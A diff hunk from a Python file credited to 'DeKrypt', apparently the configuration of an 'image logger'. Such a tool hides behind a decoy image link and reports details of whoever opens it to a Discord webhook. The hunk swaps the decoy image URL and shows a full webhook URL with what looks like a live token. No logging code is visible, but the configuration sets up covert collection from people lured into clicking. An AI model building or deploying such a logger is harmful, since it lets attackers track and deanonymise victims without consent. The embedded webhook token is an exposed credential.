@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1350667680138399887/HfAhpLPcSoe7qk52Y1oJTBxzq7M130Vc7ionv5mSrh7sh5JDwq5Wltl1AMa8s340eZjs",
-    "image": "https://www.online-tech-tips.com/wp-content/uploads/2021/07/08_spoiler-attachment.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://www.bing.com/images/search?view=detailV2&ccid=amyG%2bT%2fm&id=6F47E4DCEE1DF706D27B4FC6F159799817D64BFB&thid=OIP.amyG-T_mlDTo5B33V_Q_hQHaFi&mediaurl=https%3a%2f%2fimages.techhive.com%2fimages%2farticle%2f2014%2f04%2fwindows-xp-bliss-desktop-image-100259888-large.jpg&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.6a6c86f93fe69434e8e41df757f43f85%3frik%3d%252b0vWF5h5WfHGTw%26pid%3dImgRaw%26r%3d0&exph=434&expw=580&q=bliss+windows+PCWORLD&simid=608030038583164462&FORM=IRPRST&ck=9F817A6751F711BF44CE38C00C4D150F&selectedIndex=0&itb=0", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
